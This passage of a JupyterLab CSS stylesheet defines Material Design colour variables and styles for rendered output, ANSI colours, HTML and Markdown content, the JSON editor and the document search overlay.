  --md-deep-purple-50: #ede7f6;
  --md-deep-purple-100: #d1c4e9;
  --md-deep-purple-200: #b39ddb;
  --md-deep-purple-300: #9575cd;
  --md-deep-purple-400: #7e57c2;
  --md-deep-purple-500: #673ab7;
  --md-deep-purple-600: #5e35b1;
  --md-deep-purple-700: #512da8;
  --md-deep-purple-800: #4527a0;
  --md-deep-purple-900: #311b92;
  --md-deep-purple-A100: #b388ff;
  --md-deep-purple-A200: #7c4dff;
  --md-deep-purple-A400: #651fff;
  --md-deep-purple-A700: #6200ea;
  --md-indigo-50: #e8eaf6;
  --md-indigo-100: #c5cae9;
  --md-indigo-200: #9fa8da;
  --md-indigo-300: #7986cb;
  --md-indigo-400: #5c6bc0;
  --md-indigo-500: #3f51b5;
  --md-indigo-600: #3949ab;
  --md-indigo-700: #303f9f;
  --md-indigo-800: #283593;
  --md-indigo-900: #1a237e;
  --md-indigo-A100: #8c9eff;
  --md-indigo-A200: #536dfe;
  --md-indigo-A400: #3d5afe;
  --md-indigo-A700: #304ffe;
  --md-blue-50: #e3f2fd;
  --md-blue-100: #bbdefb;
  --md-blue-200: #90caf9;
  --md-blue-300: #64b5f6;
  --md-blue-400: #42a5f5;
  --md-blue-500: #2196f3;
  --md-blue-600: #1e88e5;
  --md-blue-700: #1976d2;
  --md-blue-800: #1565c0;
  --md-blue-900: #0d47a1;
  --md-blue-A100: #82b1ff;
  --md-blue-A200: #448aff;
  --md-blue-A400: #2979ff;
  --md-blue-A700: #2962ff;
  --md-light-blue-50: #e1f5fe;
  --md-light-blue-100: #b3e5fc;
  --md-light-blue-200: #81d4fa;
  --md-light-blue-300: #4fc3f7;
  --md-light-blue-400: #29b6f6;
  --md-light-blue-500: #03a9f4;
  --md-light-blue-600: #039be5;
  --md-light-blue-700: #0288d1;
  --md-light-blue-800: #0277bd;
  --md-light-blue-900: #01579b;
  --md-light-blue-A100: #80d8ff;
  --md-light-blue-A200: #40c4ff;
  --md-light-blue-A400: #00b0ff;
  --md-light-blue-A700: #0091ea;
  --md-cyan-50: #e0f7fa;
  --md-cyan-100: #b2ebf2;
  --md-cyan-200: #80deea;
  --md-cyan-300: #4dd0e1;
  --md-cyan-400: #26c6da;
  --md-cyan-500: #00bcd4;
  --md-cyan-600: #00acc1;
  --md-cyan-700: #0097a7;
  --md-cyan-800: #00838f;
  --md-cyan-900: #006064;
  --md-cyan-A100: #84ffff;
  --md-cyan-A200: #18ffff;
  --md-cyan-A400: #00e5ff;
  --md-cyan-A700: #00b8d4;
  --md-teal-50: #e0f2f1;
  --md-teal-100: #b2dfdb;
  --md-teal-200: #80cbc4;
  --md-teal-300: #4db6ac;
  --md-teal-400: #26a69a;
  --md-teal-500: #009688;
  --md-teal-600: #00897b;
  --md-teal-700: #00796b;
  --md-teal-800: #00695c;
  --md-teal-900: #004d40;
  --md-teal-A100: #a7ffeb;
  --md-teal-A200: #64ffda;
  --md-teal-A400: #1de9b6;
  --md-teal-A700: #00bfa5;
  --md-green-50: #e8f5e9;
  --md-green-100: #c8e6c9;
  --md-green-200: #a5d6a7;
  --md-green-300: #81c784;
  --md-green-400: #66bb6a;
  --md-green-500: #4caf50;
  --md-green-600: #43a047;
  --md-green-700: #388e3c;
  --md-green-800: #2e7d32;
  --md-green-900: #1b5e20;
  --md-green-A100: #b9f6ca;
  --md-green-A200: #69f0ae;
  --md-green-A400: #00e676;
  --md-green-A700: #00c853;
  --md-light-green-50: #f1f8e9;
  --md-light-green-100: #dcedc8;
  --md-light-green-200: #c5e1a5;
  --md-light-green-300: #aed581;
  --md-light-green-400: #9ccc65;
  --md-light-green-500: #8bc34a;
  --md-light-green-600: #7cb342;
  --md-light-green-700: #689f38;
  --md-light-green-800: #558b2f;
  --md-light-green-900: #33691e;
  --md-light-green-A100: #ccff90;
  --md-light-green-A200: #b2ff59;
  --md-light-green-A400: #76ff03;
  --md-light-green-A700: #64dd17;
  --md-lime-50: #f9fbe7;
  --md-lime-100: #f0f4c3;
  --md-lime-200: #e6ee9c;
  --md-lime-300: #dce775;
  --md-lime-400: #d4e157;
  --md-lime-500: #cddc39;
  --md-lime-600: #c0ca33;
  --md-lime-700: #afb42b;
  --md-lime-800: #9e9d24;
  --md-lime-900: #827717;
  --md-lime-A100: #f4ff81;
  --md-lime-A200: #eeff41;
  --md-lime-A400: #c6ff00;
  --md-lime-A700: #aeea00;
  --md-yellow-50: #fffde7;
  --md-yellow-100: #fff9c4;
  --md-yellow-200: #fff59d;
  --md-yellow-300: #fff176;
  --md-yellow-400: #ffee58;
  --md-yellow-500: #ffeb3b;
  --md-yellow-600: #fdd835;
  --md-yellow-700: #fbc02d;
  --md-yellow-800: #f9a825;
  --md-yellow-900: #f57f17;
  --md-yellow-A100: #ffff8d;
  --md-yellow-A200: #ff0;
  --md-yellow-A400: #ffea00;
  --md-yellow-A700: #ffd600;
  --md-amber-50: #fff8e1;
  --md-amber-100: #ffecb3;
  --md-amber-200: #ffe082;
  --md-amber-300: #ffd54f;
  --md-amber-400: #ffca28;
  --md-amber-500: #ffc107;
  --md-amber-600: #ffb300;
  --md-amber-700: #ffa000;
  --md-amber-800: #ff8f00;
  --md-amber-900: #ff6f00;
  --md-amber-A100: #ffe57f;
  --md-amber-A200: #ffd740;
  --md-amber-A400: #ffc400;
  --md-amber-A700: #ffab00;
  --md-orange-50: #fff3e0;
  --md-orange-100: #ffe0b2;
  --md-orange-200: #ffcc80;
  --md-orange-300: #ffb74d;
  --md-orange-400: #ffa726;
  --md-orange-500: #ff9800;
  --md-orange-600: #fb8c00;
  --md-orange-700: #f57c00;
  --md-orange-800: #ef6c00;
  --md-orange-900: #e65100;
  --md-orange-A100: #ffd180;
  --md-orange-A200: #ffab40;
  --md-orange-A400: #ff9100;
  --md-orange-A700: #ff6d00;
  --md-deep-orange-50: #fbe9e7;
  --md-deep-orange-100: #ffccbc;
  --md-deep-orange-200: #ffab91;
  --md-deep-orange-300: #ff8a65;
  --md-deep-orange-400: #ff7043;
  --md-deep-orange-500: #ff5722;
  --md-deep-orange-600: #f4511e;
  --md-deep-orange-700: #e64a19;
  --md-deep-orange-800: #d84315;
  --md-deep-orange-900: #bf360c;
  --md-deep-orange-A100: #ff9e80;
  --md-deep-orange-A200: #ff6e40;
  --md-deep-orange-A400: #ff3d00;
  --md-deep-orange-A700: #dd2c00;
  --md-brown-50: #efebe9;
  --md-brown-100: #d7ccc8;
  --md-brown-200: #bcaaa4;
  --md-brown-300: #a1887f;
  --md-brown-400: #8d6e63;
  --md-brown-500: #795548;
  --md-brown-600: #6d4c41;
  --md-brown-700: #5d4037;
  --md-brown-800: #4e342e;
  --md-brown-900: #3e2723;
  --md-grey-50: #fafafa;
  --md-grey-100: #f5f5f5;
  --md-grey-200: #eee;
  --md-grey-300: #e0e0e0;
  --md-grey-400: #bdbdbd;
  --md-grey-500: #9e9e9e;
  --md-grey-600: #757575;
  --md-grey-700: #616161;
  --md-grey-800: #424242;
  --md-grey-900: #212121;
  --md-blue-grey-50: #eceff1;
  --md-blue-grey-100: #cfd8dc;
  --md-blue-grey-200: #b0bec5;
  --md-blue-grey-300: #90a4ae;
  --md-blue-grey-400: #78909c;
  --md-blue-grey-500: #607d8b;
  --md-blue-grey-600: #546e7a;
  --md-blue-grey-700: #455a64;
  --md-blue-grey-800: #37474f;
  --md-blue-grey-900: #263238;
}

/*-----------------------------------------------------------------------------
| Copyright (c) 2014-2017, Jupyter Development Team.
|
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

/*-----------------------------------------------------------------------------
| RenderedText
|----------------------------------------------------------------------------*/

:root {
  /* This is the padding value to fill the gaps between lines containing spans with background color. */
  --jp-private-code-span-padding: calc(
    (var(--jp-code-line-height) - 1) * var(--jp-code-font-size) / 2
  );
}

.jp-RenderedText {
  text-align: left;
  padding-left: var(--jp-code-padding);
  line-height: var(--jp-code-line-height);
  font-family: var(--jp-code-font-family);
}

.jp-RenderedText pre,
.jp-RenderedJavaScript pre,
.jp-RenderedHTMLCommon pre {
  color: var(--jp-content-font-color1);
  font-size: var(--jp-code-font-size);
  border: none;
  margin: 0;
  padding: 0;
}

.jp-RenderedText pre a:link {
  text-decoration: none;
  color: var(--jp-content-link-color);
}

.jp-RenderedText pre a:hover {
  text-decoration: underline;
  color: var(--jp-content-link-color);
}

.jp-RenderedText pre a:visited {
  text-decoration: none;
  color: var(--jp-content-link-color);
}

/* console foregrounds and backgrounds */
.jp-RenderedText pre .ansi-black-fg {
  color: #3e424d;
}

.jp-RenderedText pre .ansi-red-fg {
  color: #e75c58;
}

.jp-RenderedText pre .ansi-green-fg {
  color: #00a250;
}

.jp-RenderedText pre .ansi-yellow-fg {
  color: #ddb62b;
}

.jp-RenderedText pre .ansi-blue-fg {
  color: #208ffb;
}

.jp-RenderedText pre .ansi-magenta-fg {
  color: #d160c4;
}

.jp-RenderedText pre .ansi-cyan-fg {
  color: #60c6c8;
}

.jp-RenderedText pre .ansi-white-fg {
  color: #c5c1b4;
}

.jp-RenderedText pre .ansi-black-bg {
  background-color: #3e424d;
  padding: var(--jp-private-code-span-padding) 0;
}

.jp-RenderedText pre .ansi-red-bg {
  background-color: #e75c58;
  padding: var(--jp-private-code-span-padding) 0;
}

.jp-RenderedText pre .ansi-green-bg {
  background-color: #00a250;
  padding: var(--jp-private-code-span-padding) 0;
}

.jp-RenderedText pre .ansi-yellow-bg {
  background-color: #ddb62b;
  padding: var(--jp-private-code-span-padding) 0;
}

.jp-RenderedText pre .ansi-blue-bg {
  background-color: #208ffb;
  padding: var(--jp-private-code-span-padding) 0;
}

.jp-RenderedText pre .ansi-magenta-bg {
  background-color: #d160c4;
  padding: var(--jp-private-code-span-padding) 0;
}

.jp-RenderedText pre .ansi-cyan-bg {
  background-color: #60c6c8;
  padding: var(--jp-private-code-span-padding) 0;
}

.jp-RenderedText pre .ansi-white-bg {
  background-color: #c5c1b4;
  padding: var(--jp-private-code-span-padding) 0;
}

.jp-RenderedText pre .ansi-black-intense-fg {
  color: #282c36;
}

.jp-RenderedText pre .ansi-red-intense-fg {
  color: #b22b31;
}

.jp-RenderedText pre .ansi-green-intense-fg {
  color: #007427;
}

.jp-RenderedText pre .ansi-yellow-intense-fg {
  color: #b27d12;
}

.jp-RenderedText pre .ansi-blue-intense-fg {
  color: #0065ca;
}

.jp-RenderedText pre .ansi-magenta-intense-fg {
  color: #a03196;
}

.jp-RenderedText pre .ansi-cyan-intense-fg {
  color: #258f8f;
}

.jp-RenderedText pre .ansi-white-intense-fg {
  color: #a1a6b2;
}

.jp-RenderedText pre .ansi-black-intense-bg {
  background-color: #282c36;
  padding: var(--jp-private-code-span-padding) 0;
}

.jp-RenderedText pre .ansi-red-intense-bg {
  background-color: #b22b31;
  padding: var(--jp-private-code-span-padding) 0;
}

.jp-RenderedText pre .ansi-green-intense-bg {
  background-color: #007427;
  padding: var(--jp-private-code-span-padding) 0;
}

.jp-RenderedText pre .ansi-yellow-intense-bg {
  background-color: #b27d12;
  padding: var(--jp-private-code-span-padding) 0;
}

.jp-RenderedText pre .ansi-blue-intense-bg {
  background-color: #0065ca;
  padding: var(--jp-private-code-span-padding) 0;
}

.jp-RenderedText pre .ansi-magenta-intense-bg {
  background-color: #a03196;
  padding: var(--jp-private-code-span-padding) 0;
}

.jp-RenderedText pre .ansi-cyan-intense-bg {
  background-color: #258f8f;
  padding: var(--jp-private-code-span-padding) 0;
}

.jp-RenderedText pre .ansi-white-intense-bg {
  background-color: #a1a6b2;
  padding: var(--jp-private-code-span-padding) 0;
}

.jp-RenderedText pre .ansi-default-inverse-fg {
  color: var(--jp-ui-inverse-font-color0);
}

.jp-RenderedText pre .ansi-default-inverse-bg {
  background-color: var(--jp-inverse-layout-color0);
  padding: var(--jp-private-code-span-padding) 0;
}

.jp-RenderedText pre .ansi-bold {
  font-weight: bold;
}

.jp-RenderedText pre .ansi-underline {
  text-decoration: underline;
}

.jp-RenderedText[data-mime-type='application/vnd.jupyter.stderr'] {
  background: var(--jp-rendermime-error-background);
  padding-top: var(--jp-code-padding);
}

/*-----------------------------------------------------------------------------
| RenderedLatex
|----------------------------------------------------------------------------*/

.jp-RenderedLatex {
  color: var(--jp-content-font-color1);
  font-size: var(--jp-content-font-size1);
  line-height: var(--jp-content-line-height);
}

/* Left-justify outputs.*/
.jp-OutputArea-output.jp-RenderedLatex {
  padding: var(--jp-code-padding);
  text-align: left;
}

/*-----------------------------------------------------------------------------
| RenderedHTML
|----------------------------------------------------------------------------*/

.jp-RenderedHTMLCommon {
  color: var(--jp-content-font-color1);
  font-family: var(--jp-content-font-family);
  font-size: var(--jp-content-font-size1);
  line-height: var(--jp-content-line-height);

  /* Give a bit more R padding on Markdown text to keep line lengths reasonable */
  padding-right: 20px;
}

.jp-RenderedHTMLCommon em {
  font-style: italic;
}

.jp-RenderedHTMLCommon strong {
  font-weight: bold;
}

.jp-RenderedHTMLCommon u {
  text-decoration: underline;
}

.jp-RenderedHTMLCommon a:link {
  text-decoration: none;
  color: var(--jp-content-link-color);
}

.jp-RenderedHTMLCommon a:hover {
  text-decoration: underline;
  color: var(--jp-content-link-color);
}

.jp-RenderedHTMLCommon a:visited {
  text-decoration: none;
  color: var(--jp-content-link-color);
}

/* Headings */

.jp-RenderedHTMLCommon h1,
.jp-RenderedHTMLCommon h2,
.jp-RenderedHTMLCommon h3,
.jp-RenderedHTMLCommon h4,
.jp-RenderedHTMLCommon h5,
.jp-RenderedHTMLCommon h6 {
  line-height: var(--jp-content-heading-line-height);
  font-weight: var(--jp-content-heading-font-weight);
  font-style: normal;
  margin: var(--jp-content-heading-margin-top) 0
    var(--jp-content-heading-margin-bottom) 0;
}

.jp-RenderedHTMLCommon h1:first-child,
.jp-RenderedHTMLCommon h2:first-child,
.jp-RenderedHTMLCommon h3:first-child,
.jp-RenderedHTMLCommon h4:first-child,
.jp-RenderedHTMLCommon h5:first-child,
.jp-RenderedHTMLCommon h6:first-child {
  margin-top: calc(0.5 * var(--jp-content-heading-margin-top));
}

.jp-RenderedHTMLCommon h1:last-child,
.jp-RenderedHTMLCommon h2:last-child,
.jp-RenderedHTMLCommon h3:last-child,
.jp-RenderedHTMLCommon h4:last-child,
.jp-RenderedHTMLCommon h5:last-child,
.jp-RenderedHTMLCommon h6:last-child {
  margin-bottom: calc(0.5 * var(--jp-content-heading-margin-bottom));
}

.jp-RenderedHTMLCommon h1 {
  font-size: var(--jp-content-font-size5);
}

.jp-RenderedHTMLCommon h2 {
  font-size: var(--jp-content-font-size4);
}

.jp-RenderedHTMLCommon h3 {
  font-size: var(--jp-content-font-size3);
}

.jp-RenderedHTMLCommon h4 {
  font-size: var(--jp-content-font-size2);
}

.jp-RenderedHTMLCommon h5 {
  font-size: var(--jp-content-font-size1);
}

.jp-RenderedHTMLCommon h6 {
  font-size: var(--jp-content-font-size0);
}

/* Lists */

/* stylelint-disable selector-max-type, selector-max-compound-selectors */

.jp-RenderedHTMLCommon ul:not(.list-inline),
.jp-RenderedHTMLCommon ol:not(.list-inline) {
  padding-left: 2em;
}

.jp-RenderedHTMLCommon ul {
  list-style: disc;
}

.jp-RenderedHTMLCommon ul ul {
  list-style: square;
}

.jp-RenderedHTMLCommon ul ul ul {
  list-style: circle;
}

.jp-RenderedHTMLCommon ol {
  list-style: decimal;
}

.jp-RenderedHTMLCommon ol ol {
  list-style: upper-alpha;
}

.jp-RenderedHTMLCommon ol ol ol {
  list-style: lower-alpha;
}

.jp-RenderedHTMLCommon ol ol ol ol {
  list-style: lower-roman;
}

.jp-RenderedHTMLCommon ol ol ol ol ol {
  list-style: decimal;
}

.jp-RenderedHTMLCommon ol,
.jp-RenderedHTMLCommon ul {
  margin-bottom: 1em;
}

.jp-RenderedHTMLCommon ul ul,
.jp-RenderedHTMLCommon ul ol,
.jp-RenderedHTMLCommon ol ul,
.jp-RenderedHTMLCommon ol ol {
  margin-bottom: 0;
}

/* stylelint-enable selector-max-type, selector-max-compound-selectors */

.jp-RenderedHTMLCommon hr {
  color: var(--jp-border-color2);
  background-color: var(--jp-border-color1);
  margin-top: 1em;
  margin-bottom: 1em;
}

.jp-RenderedHTMLCommon > pre {
  margin: 1.5em 2em;
}

.jp-RenderedHTMLCommon pre,
.jp-RenderedHTMLCommon code {
  border: 0;
  background-color: var(--jp-layout-color0);
  color: var(--jp-content-font-color1);
  font-family: var(--jp-code-font-family);
  font-size: inherit;
  line-height: var(--jp-code-line-height);
  padding: 0;
  white-space: pre-wrap;
}

.jp-RenderedHTMLCommon :not(pre) > code {
  background-color: var(--jp-layout-color2);
  padding: 1px 5px;
}

/* Tables */

.jp-RenderedHTMLCommon table {
  border-collapse: collapse;
  border-spacing: 0;
  border: none;
  color: var(--jp-ui-font-color1);
  font-size: var(--jp-ui-font-size1);
  table-layout: fixed;
  margin-left: auto;
  margin-bottom: 1em;
  margin-right: auto;
}

.jp-RenderedHTMLCommon thead {
  border-bottom: var(--jp-border-width) solid var(--jp-border-color1);
  vertical-align: bottom;
}

.jp-RenderedHTMLCommon td,
.jp-RenderedHTMLCommon th,
.jp-RenderedHTMLCommon tr {
  vertical-align: middle;
  padding: 0.5em;
  line-height: normal;
  white-space: normal;
  max-width: none;
  border: none;
}

.jp-RenderedMarkdown.jp-RenderedHTMLCommon td,
.jp-RenderedMarkdown.jp-RenderedHTMLCommon th {
  max-width: none;
}

:not(.jp-RenderedMarkdown).jp-RenderedHTMLCommon td,
:not(.jp-RenderedMarkdown).jp-RenderedHTMLCommon th,
:not(.jp-RenderedMarkdown).jp-RenderedHTMLCommon tr {
  text-align: right;
}

.jp-RenderedHTMLCommon th {
  font-weight: bold;
}

.jp-RenderedHTMLCommon tbody tr:nth-child(odd) {
  background: var(--jp-layout-color0);
}

.jp-RenderedHTMLCommon tbody tr:nth-child(even) {
  background: var(--jp-rendermime-table-row-background);
}

.jp-RenderedHTMLCommon tbody tr:hover {
  background: var(--jp-rendermime-table-row-hover-background);
}

.jp-RenderedHTMLCommon p {
  text-align: left;
  margin: 0;
  margin-bottom: 1em;
}

.jp-RenderedHTMLCommon img {
  -moz-force-broken-image-icon: 1;
}

/* Restrict to direct children as other images could be nested in other content. */
.jp-RenderedHTMLCommon > img {
  display: block;
  margin-left: 0;
  margin-right: 0;
  margin-bottom: 1em;
}

/* Change color behind transparent images if they need it... */
[data-jp-theme-light='false'] .jp-RenderedImage img.jp-needs-light-background {
  background-color: var(--jp-inverse-layout-color1);
}

[data-jp-theme-light='true'] .jp-RenderedImage img.jp-needs-dark-background {
  background-color: var(--jp-inverse-layout-color1);
}

.jp-RenderedHTMLCommon img,
.jp-RenderedImage img,
.jp-RenderedHTMLCommon svg,
.jp-RenderedSVG svg {
  max-width: 100%;
  height: auto;
}

.jp-RenderedHTMLCommon img.jp-mod-unconfined,
.jp-RenderedImage img.jp-mod-unconfined,
.jp-RenderedHTMLCommon svg.jp-mod-unconfined,
.jp-RenderedSVG svg.jp-mod-unconfined {
  max-width: none;
}

.jp-RenderedHTMLCommon .alert {
  padding: var(--jp-notebook-padding);
  border: var(--jp-border-width) solid transparent;
  border-radius: var(--jp-border-radius);
  margin-bottom: 1em;
}

.jp-RenderedHTMLCommon .alert-info {
  color: var(--jp-info-color0);
  background-color: var(--jp-info-color3);
  border-color: var(--jp-info-color2);
}

.jp-RenderedHTMLCommon .alert-info hr {
  border-color: var(--jp-info-color3);
}

.jp-RenderedHTMLCommon .alert-info > p:last-child,
.jp-RenderedHTMLCommon .alert-info > ul:last-child {
  margin-bottom: 0;
}

.jp-RenderedHTMLCommon .alert-warning {
  color: var(--jp-warn-color0);
  background-color: var(--jp-warn-color3);
  border-color: var(--jp-warn-color2);
}

.jp-RenderedHTMLCommon .alert-warning hr {
  border-color: var(--jp-warn-color3);
}

.jp-RenderedHTMLCommon .alert-warning > p:last-child,
.jp-RenderedHTMLCommon .alert-warning > ul:last-child {
  margin-bottom: 0;
}

.jp-RenderedHTMLCommon .alert-success {
  color: var(--jp-success-color0);
  background-color: var(--jp-success-color3);
  border-color: var(--jp-success-color2);
}

.jp-RenderedHTMLCommon .alert-success hr {
  border-color: var(--jp-success-color3);
}

.jp-RenderedHTMLCommon .alert-success > p:last-child,
.jp-RenderedHTMLCommon .alert-success > ul:last-child {
  margin-bottom: 0;
}

.jp-RenderedHTMLCommon .alert-danger {
  color: var(--jp-error-color0);
  background-color: var(--jp-error-color3);
  border-color: var(--jp-error-color2);
}

.jp-RenderedHTMLCommon .alert-danger hr {
  border-color: var(--jp-error-color3);
}

.jp-RenderedHTMLCommon .alert-danger > p:last-child,
.jp-RenderedHTMLCommon .alert-danger > ul:last-child {
  margin-bottom: 0;
}

.jp-RenderedHTMLCommon blockquote {
  margin: 1em 2em;
  padding: 0 1em;
  border-left: 5px solid var(--jp-border-color2);
}

a.jp-InternalAnchorLink {
  visibility: hidden;
  margin-left: 8px;
  color: var(--md-blue-800);
}

h1:hover .jp-InternalAnchorLink,
h2:hover .jp-InternalAnchorLink,
h3:hover .jp-InternalAnchorLink,
h4:hover .jp-InternalAnchorLink,
h5:hover .jp-InternalAnchorLink,
h6:hover .jp-InternalAnchorLink {
  visibility: visible;
}

.jp-RenderedHTMLCommon kbd {
  background-color: var(--jp-rendermime-table-row-background);
  border: 1px solid var(--jp-border-color0);
  border-bottom-color: var(--jp-border-color2);
  border-radius: 3px;
  box-shadow: inset 0 -1px 0 rgba(0, 0, 0, 0.25);
  display: inline-block;
  font-size: var(--jp-ui-font-size0);
  line-height: 1em;
  padding: 0.2em 0.5em;
}

/* Most direct children of .jp-RenderedHTMLCommon have a margin-bottom of 1.0.
 * At the bottom of cells this is a bit too much as there is also spacing
 * between cells. Going all the way to 0 gets too tight between markdown and
 * code cells.
 */
.jp-RenderedHTMLCommon > *:last-child {
  margin-bottom: 0.5em;
}

/*
 * Copyright (c) Jupyter Development Team.
 * Distributed under the terms of the Modified BSD License.
 */

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Copyright (c) 2014-2017, PhosphorJS Contributors
|
| Distributed under the terms of the BSD 3-Clause License.
|
| The full license is in the file LICENSE, distributed with this software.
|----------------------------------------------------------------------------*/

.lm-cursor-backdrop {
  position: fixed;
  width: 200px;
  height: 200px;
  margin-top: -100px;
  margin-left: -100px;
  will-change: transform;
  z-index: 100;
}

.lm-mod-drag-image {
  will-change: transform;
}

/*
 * Copyright (c) Jupyter Development Team.
 * Distributed under the terms of the Modified BSD License.
 */

.jp-lineFormSearch {
  padding: 4px 12px;
  background-color: var(--jp-layout-color2);
  box-shadow: var(--jp-toolbar-box-shadow);
  z-index: 2;
  font-size: var(--jp-ui-font-size1);
}

.jp-lineFormCaption {
  font-size: var(--jp-ui-font-size0);
  line-height: var(--jp-ui-font-size1);
  margin-top: 4px;
  color: var(--jp-ui-font-color0);
}

.jp-baseLineForm {
  border: none;
  border-radius: 0;
  position: absolute;
  background-size: 16px;
  background-repeat: no-repeat;
  background-position: center;
  outline: none;
}

.jp-lineFormButtonContainer {
  top: 4px;
  right: 8px;
  height: 24px;
  padding: 0 12px;
  width: 12px;
}

.jp-lineFormButtonIcon {
  top: 0;
  right: 0;
  background-color: var(--jp-brand-color1);
  height: 100%;
  width: 100%;
  box-sizing: border-box;
  padding: 4px 6px;
}

.jp-lineFormButton {
  top: 0;
  right: 0;
  background-color: transparent;
  height: 100%;
  width: 100%;
  box-sizing: border-box;
}

.jp-lineFormWrapper {
  overflow: hidden;
  padding: 0 8px;
  border: 1px solid var(--jp-border-color0);
  background-color: var(--jp-input-active-background);
  height: 22px;
}

.jp-lineFormWrapperFocusWithin {
  border: var(--jp-border-width) solid var(--md-blue-500);
  box-shadow: inset 0 0 4px var(--md-blue-300);
}

.jp-lineFormInput {
  background: transparent;
  width: 200px;
  height: 100%;
  border: none;
  outline: none;
  color: var(--jp-ui-font-color0);
  line-height: 28px;
}

/*-----------------------------------------------------------------------------
| Copyright (c) 2014-2016, Jupyter Development Team.
|
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

.jp-JSONEditor {
  display: flex;
  flex-direction: column;
  width: 100%;
}

.jp-JSONEditor-host {
  flex: 1 1 auto;
  border: var(--jp-border-width) solid var(--jp-input-border-color);
  border-radius: 0;
  background: var(--jp-layout-color0);
  min-height: 50px;
  padding: 1px;
}

.jp-JSONEditor.jp-mod-error .jp-JSONEditor-host {
  border-color: red;
  outline-color: red;
}

.jp-JSONEditor-header {
  display: flex;
  flex: 1 0 auto;
  padding: 0 0 0 12px;
}

.jp-JSONEditor-header label {
  flex: 0 0 auto;
}

.jp-JSONEditor-commitButton {
  height: 16px;
  width: 16px;
  background-size: 18px;
  background-repeat: no-repeat;
  background-position: center;
}

.jp-JSONEditor-host.jp-mod-focused {
  background-color: var(--jp-input-active-background);
  border: 1px solid var(--jp-input-active-border-color);
  box-shadow: var(--jp-input-box-shadow);
}

.jp-Editor.jp-mod-dropTarget {
  border: var(--jp-border-width) solid var(--jp-input-active-border-color);
  box-shadow: var(--jp-input-box-shadow);
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/
.jp-DocumentSearch-input {
  border: none;
  outline: none;
  color: var(--jp-ui-font-color0);
  font-size: var(--jp-ui-font-size1);
  background-color: var(--jp-layout-color0);
  font-family: var(--jp-ui-font-family);
  padding: 2px 1px;
  resize: none;
}

.jp-DocumentSearch-overlay {
  position: absolute;
  background-color: var(--jp-toolbar-background);
  border-bottom: var(--jp-border-width) solid var(--jp-toolbar-border-color);
  border-left: var(--jp-border-width) solid var(--jp-toolbar-border-color);
  top: 0;
  right: 0;
  z-index: 7;
  min-width: 405px;
  padding: 2px;
  font-size: var(--jp-ui-font-size1);

  --jp-private-document-search-button-height: 20px;
}

.jp-DocumentSearch-overlay button {
  background-color: var(--jp-toolbar-background);
  outline: 0;
}

.jp-DocumentSearch-overlay button:hover {
  background-color: var(--jp-layout-color2);
}

.jp-DocumentSearch-overlay button:active {
  background-color: var(--jp-layout-color3);
}

.jp-DocumentSearch-overlay-row {
  display: flex;
  align-items: center;
  margin-bottom: 2px;
}

.jp-DocumentSearch-button-content {
  display: inline-block;
  cursor: pointer;
  box-sizing: border-box;
  width: 100%;
  height: 100%;
}

.jp-DocumentSearch-button-content svg {
  width: 100%;
  height: 100%;
}

.jp-DocumentSearch-input-wrapper {
  border: var(--jp-border-width) solid var(--jp-border-color0);
  display: flex;
  background-color: var(--jp-layout-color0);
  margin: 2px;
}

.jp-DocumentSearch-input-wrapper:focus-within {
  border-color: var(--jp-cell-editor-active-border-color);
}

.jp-DocumentSearch-toggle-wrapper,
.jp-DocumentSearch-button-wrapper {
  all: initial;
  overflow: hidden;
  display: inline-block;
  border: none;
  box-sizing: border-box;
}

.jp-DocumentSearch-toggle-wrapper {
  width: 14px;
  height: 14px;
}

.jp-DocumentSearch-button-wrapper {
  width: var(--jp-private-document-search-button-height);
  height: var(--jp-private-document-search-button-height);
}

.jp-DocumentSearch-toggle-wrapper:focus,
.jp-DocumentSearch-button-wrapper:focus {
  outline: var(--jp-border-width) solid
    var(--jp-cell-editor-active-border-color);
  outline-offset: -1px;
}

.jp-DocumentSearch-toggle-wrapper,
.jp-DocumentSearch-button-wrapper,
.jp-DocumentSearch-button-content:focus {
  outline: none;
}

.jp-DocumentSearch-toggle-placeholder {
  width: 5px;
}

.jp-DocumentSearch-input-button::before {
  display: block;
  padding-top: 100%;
}

.jp-DocumentSearch-input-button-off {
  opacity: var(--jp-search-toggle-off-opacity);
}

.jp-DocumentSearch-input-button-off:hover {
  opacity: var(--jp-search-toggle-hover-opacity);
}

.jp-DocumentSearch-input-button-on {
  opacity: var(--jp-search-toggle-on-opacity);
}

.jp-DocumentSearch-index-counter {
  padding-left: 10px;
  padding-right: 10px;
  user-select: none;
  min-width: 35px;
  display: inline-block;
}

.jp-DocumentSearch-up-down-wrapper {
  display: inline-block;
  padding-right: 2px;
  margin-left: auto;
  white-space: nowrap;
}

.jp-DocumentSearch-spacer {
  margin-left: auto;
}

.jp-DocumentSearch-up-down-wrapper button {
  outline: 0;
  border: none;
  width: var(--jp-private-document-search-button-height);
  height: var(--jp-private-document-search-button-height);
  vertical-align: middle;
  margin: 1px 5px 2px;
}

.jp-DocumentSearch-up-down-button:hover {
  background-color: var(--jp-layout-color2);
}

.jp-DocumentSearch-up-down-button:active {
  background-color: var(--jp-layout-color3);
}

.jp-DocumentSearch-filter-button {
  border-radius: var(--jp-border-radius);
}

.jp-DocumentSearch-filter-button:hover {
  background-color: var(--jp-layout-color2);
}

.jp-DocumentSearch-filter-button-enabled {
  background-color: var(--jp-layout-color2);
}

.jp-DocumentSearch-filter-button-enabled:hover {
  background-color: var(--jp-layout-color3);
}

.jp-DocumentSearch-search-options {
  padding: 0 8px;
  margin-left: 3px;
  width: 100%;
  display: grid;
  justify-content: start;
  grid-template-columns: 1fr 1fr;
  align-items: center;
  justify-items: stretch;
}

.jp-DocumentSearch-search-filter-disabled {
  color: var(--jp-ui-font-color2);
}

.jp-DocumentSearch-search-filter {
  display: flex;
  align-items: center;
  user-select: none;
}

.jp-DocumentSearch-regex-error {
  color: var(--jp-error-color0);
}

.jp-DocumentSearch-replace-button-wrapper {
  overflow: hidden;
  display: inline-block;
  box-sizing: border-box;
  border: var(--jp-border-width) solid var(--jp-border-color0);
  margin: auto 2px;
  padding: 1px 4px;
  height: calc(var(--jp-private-document-search-button-height) + 2px);
}

.jp-DocumentSearch-replace-button-wrapper:focus {
